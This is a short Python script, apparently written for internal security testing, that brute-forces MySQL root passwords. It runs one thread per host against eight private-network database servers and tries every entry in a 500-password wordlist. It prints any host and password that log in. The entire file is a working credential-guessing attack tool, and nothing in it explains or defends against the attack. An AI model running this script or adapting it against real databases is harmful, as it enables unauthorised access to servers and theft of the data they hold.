import pymysql, threading

db_list = [('192.168.12.105', 3306),
           ('192.168.12.17', 3306),
           ('192.168.12.14', 3307),
           ('192.168.12.21', 3306),
           ('192.168.12.22', 3306),
           ('192.168.12.28', 3306),
           ('192.168.12.43', 3306),
           ('192.168.12.44', 3306)]


def pass_scan(dbs):
    with open(
            r"D:\PycharmProjects\pythonProject\security_test\top500.txt") as file:
        pwds = file.readlines()
        for pwd in pwds:
            try:
                pymysql.connect(host=dbs[0], port=dbs[1], user="root", password=pwd.strip("\n"),connect_timeout=1)
            except:
                continue
            else:
                print("发现可用的数据库及密码--->", dbs, pwd)
                break


if __name__ == '__main__':
    threads = len(db_list)
    for i in range(threads):
        dbs = db_list[i]
        threading.Thread(target=pass_scan, args=(dbs,)).start()
